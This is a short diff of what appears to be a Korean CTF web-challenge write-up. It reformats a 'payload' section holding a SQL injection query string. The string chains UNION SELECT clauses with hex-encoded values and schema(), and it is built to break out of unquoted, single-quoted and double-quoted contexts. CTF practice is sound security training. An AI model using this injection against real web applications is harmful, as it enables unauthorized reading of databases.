@@ -9,8 +9,9 @@
 * 분야 : 웹
 ~~~
 
+- payload
 ~~~
-payload : ?vuln=1%20union%20select%200x303037,1,1%23%27%20union%20select%201,0x62616e67,schema()%23"%20union%20select%201,2,%27007%27%23
+?vuln=1%20union%20select%200x303037,1,1%23%27%20union%20select%201,0x62616e67,schema()%23"%20union%20select%201,2,%27007%27%23
 ~~~
 
 ----------------------------------
